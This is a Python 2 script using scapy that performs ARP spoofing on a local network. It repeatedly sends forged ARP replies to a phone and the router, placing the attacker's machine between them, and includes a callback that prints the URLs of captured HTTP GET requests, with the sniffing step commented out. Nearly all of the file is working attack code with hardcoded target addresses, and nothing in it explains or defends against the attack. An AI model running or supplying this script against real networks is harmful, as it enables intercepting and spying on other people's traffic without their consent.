import sys
import time as time
from scapy.all import (
	get_if_hwaddr,
	getmacbyip,
	ARP,
	Ether,
	sendp,
	sniff,
	wrpcap,
	Raw,
	TCP,
	IP
)
import scapy_http.http as HTTP

Config = {
	"my_ip" : "192.168.31.250",
	# "my_mac" : get_if_hwaddr('en0'),
	"my_mac" : "a0:99:9b:04:5d:37",
	"gate_ip" : "192.168.31.1",
	# "gate_mac" : getmacbyip("192.168.31.1"),
	"gate_mac" : "28:6c:07:eb:bd:5c",
	"phone_ip" : "192.168.31.102",
	# "phone_mac" : getmacbyip("192.168.31.102")
	# "phone_mac" : "1c:9e:46:ef:e2:a7"
	"phone_mac" : ""
}
#
Config['phone_mac'] = getmacbyip(Config["phone_ip"])

def trick():
	pk = Ether(src=Config["my_mac"], dst=Config["phone_mac"]) / ARP(hwsrc=Config["my_mac"], 
	psrc=Config["gate_ip"], hwdst=Config["phone_mac"], pdst=Config["phone_ip"], op=2)

	for i in range(100):
		sendp(pk, iface="en0")

	pk_to_router = Ether(src=Config["my_mac"], dst=Config["gate_mac"]) / ARP(hwsrc=Config["my_mac"], 
		psrc=Config["phone_ip"], hwdst=Config["gate_mac"], pdst=Config["gate_ip"], op=2)

	for i in range(100):
		sendp(pk_to_router, iface="en0")

def get_url(raw):
	if raw.find("POST") != -1:
		print "POST";

	if raw.find("GET") != -1:
		print raw[raw.find("GET") : 200]
		print "============"

def callback(pkt):
	if HTTP.HTTPRequest in pkt:
		payload = pkt[TCP].payload
		if payload.Method == "GET":
			print "http://{0}{1}".format(payload.Host, payload.Path)
		

while 1:
	trick()
	time.sleep(5)

# result = sniff(filter="tcp and port 80", prn=callback, iface="en0")
# wrpcap("demo.pcap", result)

# result = sniff(offline="demo.pcap", count=100)

# for data in result:
# 	if data[TCP].payload:
# 		print data[Raw].load